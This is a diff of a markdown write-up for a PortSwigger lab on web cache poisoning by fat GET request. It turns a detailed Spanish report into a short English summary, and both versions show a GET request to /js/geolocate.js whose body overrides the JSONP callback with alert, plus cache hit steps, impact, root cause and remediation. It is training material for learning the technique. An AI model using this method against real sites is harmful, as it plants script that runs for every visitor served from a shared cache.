@@ -1,244 +1,73 @@
 # Web Cache Poisoning via Fat GET Request
 
-**Lab:** Web Cache Poisoning via Fat GET Request  
-**Plataforma:** PortSwigger Web Security Academy  
-**Categoría:** Web Cache Poisoning  
-**Dificultad:** Practitioner  
-**Estado:** Resuelto
+## Lab Information
+
+- **Platform:** PortSwigger Web Security Academy
+- **Category:** Web Cache Poisoning
+- **Difficulty:** Practitioner
+- **Technique:** Fat GET Request
 
 ---
 
-# Índice
+# Executive Summary
 
-1. Resumen ejecutivo
-2. Clasificación de la vulnerabilidad
-3. Información de la vulnerabilidad
-4. Activo afectado
-5. Descripción técnica
-6. Metodología
-7. Identificación de la vulnerabilidad
-8. Explotación
-9. Evidencias
-10. Análisis de impacto
-11. Causa raíz
-12. Recomendaciones
-13. Referencias
-14. Conclusiones
+The application accepted parameters from the request body of a GET request while generating the cache key using only the URL.
+
+This discrepancy allowed arbitrary JavaScript to be cached and delivered to other users.
 
 ---
 
-# 1. Resumen ejecutivo
-
-La aplicación es vulnerable a **Web Cache Poisoning** mediante la técnica conocida como **Fat GET Request**.
-
-La vulnerabilidad se produce porque el servidor backend procesa parámetros enviados en el **cuerpo de una petición GET**, mientras que el sistema de caché únicamente utiliza la URL para construir la **cache key**.
-
-Esta diferencia permite modificar el contenido del recurso JavaScript almacenado en caché sin alterar la clave utilizada por el proxy, provocando que todos los usuarios reciban una versión manipulada del script.
-
----
-
-# 2. Clasificación de la vulnerabilidad
-
-| Clasificación | Valor |
-|---------------|-------|
-| Tipo | Web Cache Poisoning |
-| Subtipo | Fat GET Request |
-| Impacto | Cross-Site Scripting Persistente mediante caché |
-| Severidad | Alta |
-| CWE | CWE-349 |
-| OWASP | A05 – Security Misconfiguration |
-
----
-
-# 3. Información de la vulnerabilidad
-
-## Vulnerabilidad
-
-Fat GET Request
-
-## Técnica
-
-El backend procesa parámetros enviados en el cuerpo (`body`) de una petición GET, mientras que la cache key únicamente considera los parámetros presentes en la URL.
-
----
-
-# 4. Activo afectado
+# Vulnerable Resource
 
 ```
 /js/geolocate.js
 ```
 
-Este recurso JavaScript es cargado automáticamente desde todas las páginas de la aplicación mediante:
-
-```html
-<script type="text/javascript" src="/js/geolocate.js?callback=setCountryCookie"></script>
-```
-
-En consecuencia, cualquier modificación del contenido cacheado afecta potencialmente a todos los visitantes.
-
 ---
 
-# 5. Descripción técnica
+# Discovery
 
-El recurso JavaScript utiliza un parámetro llamado `callback` para decidir qué función JavaScript ejecutará al devolver la información geográfica del usuario.
+Original request:
 
-Solicitud legítima:
-
-```http
+```
 GET /js/geolocate.js?callback=setCountryCookie
 ```
 
-Respuesta:
+Body:
 
-```javascript
-setCountryCookie({"country":"United Kingdom"});
 ```
-
-El servidor backend acepta parámetros enviados en el cuerpo de una petición GET.
-
-Al enviar:
-
-```http
 callback=alert
 ```
 
-el backend sustituye el callback original por:
+The server executed:
 
 ```javascript
 alert({"country":"United Kingdom"});
 ```
 
-Sin embargo, el servidor de caché continúa utilizando únicamente la URL:
+while the cache key remained:
 
 ```
-/js/geolocate.js?callback=setCountryCookie
+callback=setCountryCookie
 ```
-
-como clave de almacenamiento.
-
-Esto permite almacenar una versión maliciosa del recurso bajo una cache key aparentemente legítima.
 
 ---
 
-# 6. Metodología
-
-1. Identificar un recurso cacheable.
-2. Detectar parámetros utilizados dinámicamente.
-3. Verificar si el backend procesa el cuerpo de peticiones GET.
-4. Sustituir el callback mediante el body.
-5. Almacenar el recurso manipulado en caché.
-6. Acceder nuevamente al recurso desde la aplicación.
-7. Confirmar la ejecución del JavaScript inyectado.
-
----
-
-# 7. Identificación de la vulnerabilidad
-
-## 7.1 Recurso cacheable
-
-Se identificó el recurso:
+# Exploitation
 
 ```
-/js/geolocate.js
-```
-
-Respuesta:
-
-```
-Cache-Control: max-age=35
-
-X-Cache: hit
-```
-
-confirmando que el contenido era cacheado.
-
----
-
-## 7.2 Callback dinámico
-
-Solicitud original:
-
-```http
 GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
-```
-
-Respuesta:
-
-```javascript
-setCountryCookie({"country":"United Kingdom"});
-```
-
----
-
-## 7.3 Procesamiento del cuerpo de la petición GET
-
-Se añadió un cuerpo a la petición GET:
-
-```http
-GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
-Host: <LAB>
-
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 14
 
 callback=alert
 ```
 
-Respuesta obtenida:
-
-```javascript
-alert({"country":"United Kingdom"});
-```
-
-Esto confirmó que el backend procesaba parámetros enviados en el body incluso utilizando el método GET.
-
----
-
-# 8. Explotación
-
-## Paso 1
-
-Enviar una petición GET con un cuerpo que sobrescriba el callback:
-
-```http
-GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
-Host: <LAB>
-
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 14
-
-callback=alert
-```
-
----
-
-## Paso 2
-
-Esperar a que expire la entrada cacheada existente.
-
----
-
-## Paso 3
-
-Repetir la petición hasta obtener:
-
-```
-X-Cache: miss
-```
-
-seguido de:
+After caching:
 
 ```
 X-Cache: hit
 ```
 
-garantizando que la nueva respuesta se almacenaba en caché.
-
----
-
-## Paso 4
-
-La respuesta almacenada pasó a ser:
+All visitors executed:
 
 ```javascript
 alert({"country":"United Kingdom"});
@@ -246,148 +75,26 @@ alert({"country":"United Kingdom"});
 
 ---
 
-## Paso 5
+# Impact
 
-Acceder a la página principal.
-
-El navegador carga automáticamente:
-
-```html
-<script src="/js/geolocate.js?callback=setCountryCookie"></script>
-```
-
-Al encontrarse el recurso ya envenenado, se ejecutó:
-
-```javascript
-alert({"country":"United Kingdom"});
-```
+Shared cache poisoning enables persistent JavaScript execution against every visitor.
 
 ---
 
-# 9. Evidencias
+# Root Cause
 
-## Respuesta legítima
-
-```javascript
-setCountryCookie({"country":"United Kingdom"});
-```
+The backend processed GET request bodies while the cache ignored them.
 
 ---
 
-## Respuesta modificada
+# Remediation
 
-```javascript
-alert({"country":"United Kingdom"});
-```
-
----
-
-## Recurso cacheado
-
-```
-X-Cache: hit
-```
+- Reject GET request bodies.
+- Generate cache keys using all request inputs.
+- Follow HTTP specifications consistently.
 
 ---
 
-## Confirmación
+# Result
 
-Al acceder nuevamente a la página principal apareció el cuadro de diálogo:
-
-```
-alert({"country":"United Kingdom"});
-```
-
-Posteriormente el laboratorio fue marcado como:
-
-```
-Lab Solved
-```
-
----
-
-# 10. Análisis de impacto
-
-La vulnerabilidad permite modificar recursos JavaScript compartidos entre todos los usuarios.
-
-Un atacante podría:
-
-- Ejecutar JavaScript arbitrario.
-- Robar cookies no protegidas con HttpOnly.
-- Robar tokens CSRF.
-- Capturar credenciales.
-- Redirigir usuarios hacia sitios maliciosos.
-- Registrar pulsaciones del teclado.
-- Modificar completamente el comportamiento del sitio.
-- Distribuir malware mediante recursos JavaScript compartidos.
-
-El impacto es elevado debido a que un único envenenamiento afecta potencialmente a todos los usuarios que utilicen la misma entrada de caché.
-
----
-
-# 11. Causa raíz
-
-La vulnerabilidad aparece por la combinación de varios errores de diseño:
-
-- El backend procesa parámetros enviados en el cuerpo de peticiones GET.
-- El servidor de caché ignora completamente el body al construir la cache key.
-- El recurso JavaScript permite controlar directamente el callback ejecutado.
-- Existe una diferencia de interpretación entre el backend y el sistema de caché.
-
----
-
-# 12. Recomendaciones
-
-## Prioridad crítica
-
-No procesar parámetros enviados en el cuerpo de peticiones GET.
-
----
-
-## Prioridad alta
-
-Construir la cache key considerando todos los elementos que puedan modificar la respuesta generada.
-
----
-
-## Prioridad alta
-
-Eliminar callbacks controlables por el usuario en recursos JavaScript.
-
----
-
-## Prioridad alta
-
-Separar completamente contenido dinámico de recursos cacheables.
-
----
-
-## Prioridad media
-
-Aplicar políticas CSP para reducir el impacto de posibles XSS.
-
----
-
-## Prioridad media
-
-Auditar todos los recursos JavaScript susceptibles de ser cacheados.
-
----
-
-# 13. Referencias
-
-- PortSwigger Web Security Academy – Web Cache Poisoning
-- PortSwigger – Fat GET Requests
-- OWASP Web Cache Poisoning
-- RFC 7234 – HTTP Caching
-- CWE-349
-
----
-
-# 14. Conclusiones
-
-Este laboratorio demuestra cómo una diferencia entre el procesamiento realizado por el backend y la construcción de la cache key puede convertirse en una vulnerabilidad crítica.
-
-El backend acepta parámetros enviados en el cuerpo de una petición GET y utiliza dicha información para generar el contenido JavaScript, mientras que el sistema de caché únicamente considera la URL. Esta discrepancia permite almacenar respuestas manipuladas bajo una cache key legítima.
-
-Como resultado, un atacante puede transformar un recurso JavaScript utilizado por toda la aplicación en un vector persistente de Cross-Site Scripting, afectando a todos los usuarios que reciban la respuesta cacheada hasta que esta expire o sea reemplazada.
+**Lab Successfully Solved**
